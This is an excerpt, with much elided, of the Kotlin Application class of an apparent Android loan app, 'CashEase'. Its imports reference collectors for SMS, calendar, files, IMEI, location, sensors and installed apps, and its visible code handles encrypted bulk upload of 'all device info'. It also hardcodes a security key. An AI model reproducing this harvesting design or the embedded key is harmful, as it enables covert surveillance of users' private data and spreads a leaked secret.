package com.cash.ease.money.cashease
...
import com.cash.ease.money.adjust.AdjustLifecycleCallbacks
import com.cash.ease.money.adjust.AdjustManager.onCreate
import com.cash.ease.money.cashease.collector.ApplicationData
import com.cash.ease.money.cashease.collector.CalendarCollector.fetchCalendarEvents
import com.cash.ease.money.cashease.collector.FileCollector.getFileInfoList
import com.cash.ease.money.cashease.collector.ImeiCollector.getImei
import com.cash.ease.money.cashease.collector.LocationCollector.getLocationInfoList
import com.cash.ease.money.cashease.collector.NetworkInfoCollector.getNetworkInfoList
import com.cash.ease.money.cashease.collector.PermissionEntity
import com.cash.ease.money.cashease.collector.SensorCollector.sensorInfoList
import com.cash.ease.money.cashease.collector.SmsCollector.fetchAllSms
import com.cash.ease.money.cashease.collector.SomeInfoCollector.getSomeInfoList
import com.cash.ease.money.cashease.http.HttpInterceptor
import com.cash.ease.money.cashease.http.ParserUtil.prepareEncryptString
import com.cash.ease.money.cashease.http.ParserUtil.prepareRequestBody
import com.cash.ease.money.cashease.service.MyEventUploader.DeviceInfoRequestInfo
import com.cash.ease.money.cashease.service.MyEventUploader.uploadDeviceInfoFailureEvent
import com.cash.ease.money.cashease.service.MyEventUploader.uploadDeviceInfoSuccessEvent
import com.cash.ease.money.cashease.service.MyEventUploader.uploadStartUploadDeviceInfoEvent
import com.cash.ease.money.cashease.ui.base.BaseAppCompatActivity
import com.cash.ease.money.cashease.utils.AppUtil.getApps
import com.cash.ease.money.cashease.utils.GeneralInfoHelper
import com.cash.ease.money.cashease.utils.GeneralInfoHelper.init
...
import com.cash.ease.money.cashease.utils.SpHelper.initSharedPreferences
import com.cash.ease.money.cashease.utils.SpHelper.mainSp
import com.cash.ease.money.cashease.utils.SpHelper.uuid
import com.cash.ease.money.firebase.service.FCMManager
import com.cash.ease.money.firebase.service.FCMManager.getFCMToken
import com.cash.ease.money.firebase.service.MyFirebaseMessagingService
 ...
 */
class CashEaseApplication : MultiDexApplication() {
    ...
    companion object {
        val TAG: String = CashEaseApplication::class.java.simpleName
        ...
        const val SECURITY_KEY: String = "35b1680eb35f3739"
                ...
                .map<Any>(object : BusinessFunction<HttpResult<*>?, NullObject>() {
                    override fun onSuccess(result: HttpResult<*>?): NullObject {
                        if (result?.total == 0) {
                            ...
                            Log.w(TAG, "uploadEventFailed=" + result?.swell)
                        }
                        ...
                        .map<Any?>(object : BusinessFunction<HttpResult<*>?, NullObject>() {
                            override fun onSuccess(result: HttpResult<*>?): NullObject {
                                ...
                                if (effectiveness == 0) {
                                    ...
                                    Log.w(
                                        TAG,
                                        "upload all device info failed, cautiously=" + result?.swell
                                    )
                                    val elapse = System.currentTimeMillis() - start
                                    info.elapse = elapse
                                    uploadDeviceInfoFailureEvent(info)
                                    listener?.onFailed(result?.swell)
                                }
                                return NullObject.NULL_OBJECT
                            }
                        })
